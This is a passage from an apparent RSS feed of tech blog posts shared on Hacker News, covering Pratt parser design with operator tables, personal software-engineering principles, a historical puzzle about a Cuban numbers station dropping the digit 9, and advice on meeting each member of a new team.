  <span>// etc.
</span><span>}</span>
</code></pre></div></div>

<p>This class establishes the Multiply operator as an infix, left associative operator. We have also initialized our operator precedence to 40. Again, the <code>InfixLeftAssoc</code> superclass and other ancestor classes compute left and right binding power (LBP and RBP) from the value of precedence and associativity and implement the <code>led</code> method (“left donation” parselette method) and any utility methods and members. This concrete subclass serves the following purposes:</p>

<ol>
  <li>encodes the affix (by specifying its superclass)</li>
  <li>encodes the associativity  (by specifying its superclass)</li>
  <li>records the precedence</li>
  <li>provides a home for <code>MultiplyMethodA</code> and <code>MultiplyMethodB</code></li>
</ol>

<p>But why are we using different classes at all? This OOP design has several flaws:</p>

<ul>
  <li>It violates the principle of separation of concerns: Why are AST nodes doing the work of the parser?</li>
  <li>It violates the DRY Principle: Unless you autogenerate the code, you need to write a class for every operator—even if you relegate the parslet code to a handful of superclasses.</li>
  <li>This parser design is littered with static data: operator tokens, constants for precedence, associativity, affix, and token IDs, all of which is redundant, as it exists in a table used by the driver algorithm anyway. (Ironically, it is precisely because of its object-oriented design that the code and the data it acts upon are so disparate. This is not entirely the fault of OOP per se but rather of a poor choice of what concepts should be materialized as objects.)</li>
  <li>Generalizing the previous point: This design fixes the language at compile time. If you want to change the precedence of an operator, you need to rewrite, recompile, and redeploy the parser.</li>
  <li>It is cumbersome to write an operator table statically: Unless the code is automatically generated, writing “<code>parser.registeroperator(op, prec, assoc, whatever)</code>,” the code that line depends on, and every subclass for every single operator is a bummer. Even if you autogenerate code, you have to write a code generator.</li>
</ul>

<p>❝The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place.❞</p>

<p>The temptation to write a code generator is often a sign that a more flexible design exists, a design that exploits whatever regularity exists in the code that makes programmatically generating the code possible in the first place. <em>In principle</em>, if code can automatically be generated, it can also be automatically compiled and executed. So maybe the (hypothetical) generate-compile-run pipeline (usually called a JIT or jitter) can be refactored to eliminate the compile step. In our case, instead of writing a bespoke Pratt parser in which the operator table is both encoded in the class hierarchy and generated again at runtime, why not write a generic Pratt parser that reads in the operator database at startup? As a bonus, modifying the language does not require a recompile: You can add, remove, or modify operators at <em>runtime</em> if you’d like, and maintaining the expression grammar is as simple as editing a value in a spreadsheet. (Indeed, it could be literally that!)</p>

<h3 id="operator-database">Operator Database</h3>

<p>As a toy example, we might have an operator database as follows.</p>

<table>
  <thead>
    <tr>
      <th>TokenID</th>
      <th>Operator</th>
      <th>NameString</th>
      <th>Precedence</th>
      <th>Associativity</th>
      <th>Affix</th>
      <th>Arity</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>1</td>
      <td><code>"123"</code></td>
      <td><code>"Number"</code></td>
      <td>0</td>
      <td>None</td>
      <td>Null</td>
      <td>Nullary</td>
    </tr>
    <tr>
      <td>2</td>
      <td><code>"^"</code></td>
      <td><code>"Power"</code></td>
      <td>10</td>
      <td>Right</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>3</td>
      <td><code>"*"</code></td>
      <td><code>"Times"</code></td>
      <td>20</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>4</td>
      <td><code>"/"</code></td>
      <td><code>"Divide"</code></td>
      <td>20</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>5</td>
      <td><code>"+"</code></td>
      <td><code>"Plus"</code></td>
      <td>30</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>6</td>
      <td><code>"-"</code></td>
      <td><code>"Minus"</code></td>
      <td>30</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
  </tbody>
</table>

<p>The <code>TokenID</code> might be supplied by the lexer/scanner (many Pratt parsers are scanner-less) and will be used as the identifier. <code>Operator</code> and <code>NameString</code> are only used for printing output. The remaining columns are required to compute the left and right binding powers of each operator. In this example language, every operator is either a terminal (number) or a binary infix operator.</p>

<h3 id="more-sophisticated-operators">More Sophisticated Operators</h3>

<p>Suppose we have ternary, mixfix, or matchfix operators. Then we need to modify the operator database to reflect how the operator tokens appear in an expression. A portion of our operator table might now look like this.</p>

<table>
  <thead>
    <tr>
      <th>TokenID</th>
      <th>LToken</th>
      <th>NToken</th>
      <th>OToken</th>
      <th>NameString</th>
      <th>Precedence</th>
      <th>Associativity</th>
      <th>Affix</th>
      <th>Arity</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>10</td>
      <td><code>"("</code></td>
      <td>&nbsp;</td>
      <td><code>")"</code></td>
      <td><code>"Parentheses"</code></td>
      <td>10</td>
      <td>Non</td>
      <td>Matchfix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
      <td>⋮</td>
    </tr>
    <tr>
      <td>43</td>
      <td><code>"["</code></td>
      <td>&nbsp;</td>
      <td><code>"]"</code></td>
      <td><code>"Index"</code></td>
      <td>30</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>44</td>
      <td>&nbsp;</td>
      <td><code>"!"</code></td>
      <td>&nbsp;</td>
      <td><code>"Factorial"</code></td>
      <td>40</td>
      <td>Left</td>
      <td>Postfix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>46</td>
      <td>&nbsp;</td>
      <td><code>"-"</code></td>
      <td>&nbsp;</td>
      <td><code>"UnaryMinus"</code></td>
      <td>50</td>
      <td>Right</td>
      <td>Prefix</td>
      <td>Unary</td>
    </tr>
    <tr>
      <td>49</td>
      <td><code>"/"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Divide"</code></td>
      <td>60</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>55</td>
      <td><code>"?"</code></td>
      <td>&nbsp;</td>
      <td><code>":"</code></td>
      <td><code>"IfThenElse"</code></td>
      <td>70</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Ternary</td>
    </tr>
    <tr>
      <td>57</td>
      <td><code>"+"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Plus"</code></td>
      <td>80</td>
      <td>Full</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
    <tr>
      <td>60</td>
      <td><code>"-"</code></td>
      <td>&nbsp;</td>
      <td>&nbsp;</td>
      <td><code>"Minus"</code></td>
      <td>90</td>
      <td>Left</td>
      <td>Infix</td>
      <td>Binary</td>
    </tr>
  </tbody>
</table>

<p>In this design, the database includes which tokens of the operator can take a left operand (<code>LToken</code>), can begin an expression (no left operand, <code>NToken</code>), or are included in some other position (<code>OToken</code>).</p>

<blockquote>
  <p>The <code>LToken</code>, <code>NToken</code>, <code>OToken</code>, <code>Affix</code>, and <code>Arity</code> can all be inferred from a single example usage, for example:
<code>op1 ? op2 : op3</code>
This suggests that there may be a way to generate a parser for an expression language using nothing but examples. Indeed, there is!</p>
</blockquote>

<p>To reiterate the point, this table of operators might live in a plaintext CSV file. At startup—not at compile time—the Pratt parser reads in the operator table. AST nodes know their identity by their <code>TokenID</code> (which is really an operator ID) or string representation and perform identity-specific actions via dynamic dispatch.</p>

<h3 id="dynamic-dispatch">Dynamic Dispatch</h3>

<p>That last sentence should have raised your suspicion. A fundamental benefit of this design, I claim, is that it keeps you from having to write boilerplate for every operator. Are we just shifting the boilerplate from the …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.robertjacobson.dev/designing-a-pratt-parser-generator">https://www.robertjacobson.dev/designing-a-pratt-parser-generator</a></em></p>]]>
            </description>
            <link>https://www.robertjacobson.dev/designing-a-pratt-parser-generator</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513092</guid>
            <pubDate>Fri, 18 Sep 2020 04:46:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Principles for Building Software]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512801">thread link</a>) | @dailymorn
<br/>
September 17, 2020 | http://kevinmahoney.co.uk/articles/my-principles-for-building-software/ | <a href="https://web.archive.org/web/*/http://kevinmahoney.co.uk/articles/my-principles-for-building-software/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article itemscope="" itemtype="http://schema.org/BlogPosting" id="my-principles-for-building-software">
  <div itemprop="articleBody">
    <p><time itemprop="datePublished">17 September 2020</time></p>

<p>These are my personal principles for building software. I hope to frequently update them as my views change. There can be
valid reasons for breaking them (they are <em>principles</em>, not <em>laws</em>), but in general I believe following
them works out well.</p>

<p>Most of them revolve around making the system simpler in some way. It’s
my belief that simpler systems are more reliable, easier and quicker to modify,
and generally easier to work with.</p>

<ul>
  <li><a href="#make-invalid-states-unrepresentable">Make Invalid States Unrepresentable</a></li>
  <li><a href="#data-consistency-makes-systems-simpler">Data Consistency Makes Systems Simpler</a></li>
  <li><a href="#design-data-first">Design “Data First”</a></li>
  <li><a href="#measure-before-you-cut">Measure Before You Cut</a></li>
  <li><a href="#avoid-trading-local-simplicity-for-global-complexity">Avoid Trading Local Simplicity for Global Complexity</a></li>
  <li><a href="#recognise-intrinsic-complexity">Recognise Intrinsic Complexity</a></li>
  <li><a href="#fewer-technologies-result-in-simpler-systems">Fewer Technologies Result in Simpler Systems</a></li>
  <li><a href="#focus-your-learning-on-concepts-not-technologies">Focus Your Learning on Concepts, not Technologies</a></li>
  <li><a href="#code-consistency-is-important">Code Consistency is Important</a></li>
  <li><a href="#shared-principles-are-important">Shared Principles are Important</a></li>
</ul>

<h2 id="make-invalid-states-unrepresentable">Make Invalid States Unrepresentable</h2>

<p>I have put this first because I think it is one of the most important
and most powerful principles.</p>

<p>You may have heard this phrase in relation to designing your program’s types, but
the principle applies everywhere you represent data - for example database design.</p>

<p>Not only does this reduce the number of states
your system can be in (and thus make it simpler), but it reduces the
number of <em>invalid</em> states, which is even better! Your system does not
have to handle these states because they literally cannot be
represented in your program.</p>

<p>This is not just a minor convenience, it can drastically simplify your system and prevent
entire classes of bugs from occurring.</p>

<h2 id="data-consistency-makes-systems-simpler">Data Consistency Makes Systems Simpler</h2>

<p>Consistency enforces rules on your data, and so reduces the number
of states your system needs to handle. This follows on from the
“make invalid states unrepresentable” principle.</p>

<p>I am using consistency here in a very general sense: that your data
adheres to certain rules, and that it always obeys those rules
at every point in time. This definition is related to ACID consistency, and shouldn’t be confused with CAP consistency.</p>

<p>The rules can be any pretty much anything, for example, 
that your credit should never be able to go negative,
or that private posts should not be visible to others.
It is not restricted to foreign keys or unique indexes, although
they are also valid examples.</p>

<p>As well as your database, consistency may be enforced by your
application utilising ACID transactions. It is preferable to enforce
them at the database level, but this is not common practice for
anything more complex than simple checks for practical reasons.</p>

<p>Anything which restricts or compromises consistency results in complexity.
This leads to the following practical advice:</p>

<p>It is simpler to have:</p>
<ul>
  <li>Fewer databases (ideally one)</li>
  <li>Normalised, less redundant data</li>
  <li>A ‘good’ database design (big topic)</li>
  <li>ACID transactions</li>
  <li>More data constraints</li>
</ul>

<p>It is more complex to have:</p>
<ul>
  <li>Multiple databases</li>
  <li>Redundant or denormalised data</li>
  <li>A poor database design</li>
  <li>Fewer (or no) data constraints</li>
</ul>

<p>Of course, there are valid reasons to make your system more complex, and I don’t
intend complexity to be a dirty word, but see <a href="#measure-before-you-cut">“measure before you cut”</a>.</p>

<p>I consider this principle to be one of the most undervalued in
software engineering today. Consistency issues often go unrecognised.
Many problems, I daresay <em>most</em> problems,
are consistency issues at an essential level - data that does
not conform to some expectation.</p>

<p>See <a href="#appendix-a-inconsistency-results-in-complexity">the appendix</a> for an illustration of how inconsistency can cause complexity.</p>

<h2 id="design-data-first">Design “Data First”</h2>

<p>What is more likely to be around in 10 years: your code or your data?</p>

<p>Code can be thrown away and re-written, but this is rarely the case
with data.</p>

<p>Data is more important than code. The only purpose of code is to transform data.</p>

<p>When designing a new system, it’s best to start with your database and
your data structures and build your code on top of that. Consider
the constraints you can place on your data and enforce them, ideally
by the way your represent your data.</p>

<p>Code design flows naturally from data design. The simpler and more
consistent your data model is, the simpler your code will be.</p>

<blockquote>
<p>Show me your flowcharts and conceal your tables,
and I shall continue to be mystified. Show me your tables,
and I won’t usually need your flowcharts; they’ll be obvious</p>

</blockquote>

<blockquote>
<p>Bad programmers worry about the code. Good programmers worry about data structures and their relationships.</p>

</blockquote>

<h2 id="measure-before-you-cut">Measure Before You Cut</h2>

<p>This is the most common mistake made by software developers.
It’s responsible for <em>many</em> self-inflicted problems.</p>

<p>The principle is that when you make a trade-off that has a complexity cost, ensure that
the need for the trade-off is backed by emprical evidence.</p>

<p>Common mistakes:</p>

<ul>
  <li>Trying to build a complex “scalable” system that scales to
a size you’ll never need.</li>
  <li>Making services as small as possible without considering
need or cost.</li>
  <li>Adding inconsistency or complexity for performance in a part
of the system that is not a performance bottleneck.</li>
</ul>

<p>Advice:</p>

<ul>
  <li>Start with the simplest, most correct system possible.</li>
  <li>Measure performance.</li>
  <li>Do not pay complexity costs or violate the other principles
until it solves an actual problem, not an imaginary one.</li>
  <li>Some optimisations can be made without measurement, because
they have very little or zero cost. For example, using the
correct data structures that support favourable performance
for the operations you want to perform.</li>
  <li>It’s true that sometimes experience alone can tell you if you’re making the
correct trade-off. It’s still better if you can prove it.</li>
  <li>When you have to choose, prefer correctness and simplicity over performance.</li>
  <li>In some cases correct and simple code is the best performing code!</li>
</ul>

<blockquote>
<p>The real problem is that programmers have spent far too much time
worrying about efficiency in the wrong places and at the wrong times;
premature optimization is the root of all evil (or at least most of
it) in programming.</p>

</blockquote>

<h2 id="avoid-trading-local-simplicity-for-global-complexity">Avoid Trading Local Simplicity for Global Complexity</h2>

<p>i.e. avoid making a part of the system simpler in exchange for making
the system as a whole more complex.</p>

<p>This trade is usually not an even one. Chasing after local simplicity can
cause and order of magnitude increase in global complexity.</p>

<p>For example, smaller services can make those services simpler,
but the reduction in consistency and the need for more inter-process
communication makes the system much more complicated.</p>

<h2 id="recognise-intrinsic-complexity">Recognise Intrinsic Complexity</h2>

<p>Sometimes things are just complicated. You cannot make problems simpler than they are.</p>

<p>Any attempt to do so will ironically make your system more complex.</p>

<h2 id="fewer-technologies-result-in-simpler-systems">Fewer Technologies Result in Simpler Systems</h2>

<p>It is better to understand a few technologies deeply than many
technologies at a surface level. Fewer technologies mean fewer
things to learn, and less operational complexity.</p>

<h2 id="focus-your-learning-on-concepts-not-technologies">Focus Your Learning on Concepts, not Technologies</h2>

<p>Do not concern yourself too much with intricate details of the software you use - you
can always look them up. Learn the underlying fundamental concepts.</p>

<p>Technologies change, concepts are eternal. The concepts you learn will
be used in newer technologies, and you will be able to learn them much quicker.</p>

<p>For example, do not concern yourself so much with the surface level
details of React, Kubernetes, Haskell, Rust, etc.</p>

<p>Focus on learning:</p>
<ul>
  <li>Pure functional programming</li>
  <li>The relational model</li>
  <li>Formal methods</li>
  <li>Logic programming</li>
  <li>Algebraic data types</li>
  <li>Typeclasses (in general and specific ones)</li>
  <li>The borrow checker (affine/linear types)</li>
  <li>Dependant Types</li>
  <li>The Curry-Howard Isomorphism</li>
  <li>Macros</li>
  <li>Homoiconicity</li>
  <li>VirtualDOM</li>
  <li>Linear regression</li>
  <li>etc.</li>
</ul>

<h2 id="code-consistency-is-important">Code Consistency is Important</h2>

<p>This is important for keeping the barrier to entry for understanding your code low.</p>

<p>Sometimes writing the consistent thing is more important than writing
the “correct” thing. If you want to change the way something works in
your codebase, change all instances of it.  Otherwise, try to stick
with it.</p>



<p>The more principles you have in common with your teammates, the better
you will work together, and the more you will enjoy working together.</p>

<h2 id="appendix-a-inconsistency-results-in-complexity">Appendix A: Inconsistency Results in Complexity</h2>

<p>This is the simplest example I can think of to illustrate this principle.
I hope it doesn’t require too much imagination to relate to realistic
problems.</p>

<p>Consider a database with two Boolean variables <code>x</code> and <code>y</code>. Your
application has a rule that <code>x = y</code>, and it can enforce this rule by
using a transaction to atomically change both variables.</p>

<p>If this rule is correctly enforced, your data can only be
in two states: <code>(x = True, y = True)</code> or <code>(x = False, y = False)</code>.</p>

<p>Writing the function ‘toggle’ with this rule in place is
straightforward. You atomically read one of the values and set both
values to the negation.</p>

<p>Now consider what happens if you split those variables into their own
databases and they can no longer be atomically changed together.</p>

<p>Because you can no longer consistently ensure that <code>x = y</code>, your data
can be in two more states: <code>(x = True, y = False)</code> or <code>(x = False, y = True)</code>.</p>

<ul>
  <li>Which value should you use if your system is in one of these states?</li>
  <li>What should your ‘toggle’ function do in one of these states?</li>
  <li>How do you ensure that both writes are successful when writing a new value?</li>
</ul>

<p>There are no correct answers to these questions.</p>

<p>Of course, if we’d followed the <a href="#make-invalid-states-unrepresentable">“make invalid states unrepresentable”</a> principle
in the first place, there would only be one variable! :)</p>

  </div>
</article></div>]]>
            </description>
            <link>http://kevinmahoney.co.uk/articles/my-principles-for-building-software/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512801</guid>
            <pubDate>Fri, 18 Sep 2020 03:50:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Cryptologic Mystery]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512546">thread link</a>) | @wglb
<br/>
September 17, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenćion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512546</guid>
            <pubDate>Fri, 18 Sep 2020 03:03:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Meeting Everyone on a New Team]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512527">thread link</a>) | @craigkerstiens
<br/>
September 17, 2020 | https://www.annashipman.co.uk/jfdi/meeting-everyone.html | <a href="https://web.archive.org/web/*/https://www.annashipman.co.uk/jfdi/meeting-everyone.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="meeting-everyone">
    
    <date>17 September 2020</date>
      <p>When I joined the Financial Times as Technical Director for FT.com, I inherited a team of around 50 engineers. One of the first things I did was meet each of them for a one-to-one. I was initially resistant, but it was extremely valuable, I’m glad I did it, and I would definitely do it again in a future role.</p>

<h2 id="my-mentors-advice-about-the-content-of-the-meeting">My mentor’s advice about the content of the meeting</h2>

<p>The idea was suggested to me by a mentor, who’d been advised to do it by <em>his</em> mentor, a Rear Admiral, who said this was something you should do whenever you have a team of fewer than 150 people. My mentor gave me some tips:</p>

<ul>
  <li>Be clear about whether you will take action or whether this is for information only.</li>
  <li>This should mostly be about listening – you should talk for maybe 5 minutes and they should talk for 25.</li>
  <li>It’s to find out what’s going well and what’s not going well.</li>
  <li>It’s informal, but make sure it’s in an enclosed meeting room so that people feel they can speak freely.</li>
  <li>Sometimes it will be quite boring, sometimes you may just learn a lot about someone’s family or hobbies, but that is useful from a getting to know people/relationship-building perspective and it means that you know some things about that person.</li>
  <li>Aim is to get a bit about their background, their priorities and their pressures.</li>
</ul>

<h2 id="making-time-was-hard">Making time was hard</h2>

<p>I was initially resistant because of the time commmitment. With a team of ~50, that’s a lot of hours, and I was also working four days a week so each meeting takes up a greater proportion of time. However, once I’d made the decision to do this and announced my intention, it was important to me to follow through, so I made sure to make time.</p>

<p>I scheduled four of these 1:1s a week, starting with the people reporting directly to me and then on down the management chain.</p>

<h2 id="i-ran-each-meeting-in-the-same-way">I ran each meeting in the same way</h2>

<p>Firstly I ran through everything I planned to cover, and then stepped through it.</p>


<ul>
  <li>I am asking the same questions to everyone</li>
  <li>This is information for me only to get an idea of themes and how things are going; I’m not explicitly planning to take action on anything we discuss, so if something comes up that I need to take action on, let’s make sure we discuss that after this meeting</li>
  <li>This is confidential. If you say something about someone else I’m not going to go and tell them. I may report on ‘what people are saying’, but I’ll say ‘the engineers feel’ or ‘an engineer said’; I won’t say “[Your name] said…”</li>
</ul>

<h3 id="what-were-going-to-discuss">What we’re going to discuss</h3>

<ul>
  <li>First I’ll introduce myself, and tell you a bit about my background</li>
  <li>Then, if you like, I’d love you to tell me a bit about yourself – as much or as little as you feel like sharing</li>
  <li>Then we’ll discuss the following questions:</li>
</ul>

<ol>
  <li>What do you think the most important things we should be doing over the next year?</li>
  <li>What will get in the way of us doing that?</li>
  <li>What’s going well, i.e. what should we make sure we don’t change?</li>
  <li>Is there anything you think I should know about?</li>
</ol>

<h2 id="is-there-anything-i-should-know-about">Is there anything I should know about?</h2>

<p>When I asked this question I talked a bit about why I was asking. I explained that I might not necessarily see or know things that may seem apparent to them, and while they should always feel able to bring things to me, now was a good opportunity to do so. It was an opportunity to make sure I’ve heard what’s important to you, what things should change and what things should stay the same.</p>

<p>This question always elicited very interesting responses, from organisational issues, to personal information people felt it was valuable for me to know about them.</p>

<h2 id="i-told-them-what-i-was-planning-to-ask-in-advance">I told them what I was planning to ask in advance</h2>

<p>I put all the information in the meeting invite.</p>

<div>
<p>I mentioned that I wanted to have a chat with everyone on FT.com to understand how things are going, does this time suit you for this?</p>

<p>The meeting agenda is the same for everyone; a quick intro and then the following questions (I'll go through this in the meeting too):</p>

<ul>
<li>What do you think the most important things we should be doing over the next year?</li>
<li>What will get in the way of us doing that?</li>
<li>What’s going well, i.e. what should we make sure we don’t change?</li>
<li>Is there anything you think I should know about?</li>
</ul>

<p>Thanks,</p>
<p>Anna</p>
</div>

<p>Some people did not read the meeting invite and came with no idea what the meeting was about. Some people had fully prepared and written notes that they then read out to me. Actually people having prepared sometimes was less useful, because sometimes it led the conversation to solutions rather than problems. However it was great that people had really given it some thought.</p>

<h2 id="making-notes-felt-too-much-like-a-promise">Making notes felt too much like a promise</h2>

<p>Each meeting was half an hour. In the very first one, I made notes in a notebook, but I realised that created an implicit commitment that I was going to take action on everything that was said, even though I had said it was information only.</p>

<p>However, I do not have a very good memory, so for all the subsequent ones I made a few notes after each meeting of key themes. This meant I couldn’t do more than two in a row or go straight into another meeting, so it made scheduling slightly harder. These days, people are much more aware of the shorter meeting approach so if doing this again, I’d go for the ‘therapy hour’ – 25 minutes for conversation then 5 minutes for me to make the notes.</p>

<h2 id="introducing-myself">Introducing myself</h2>

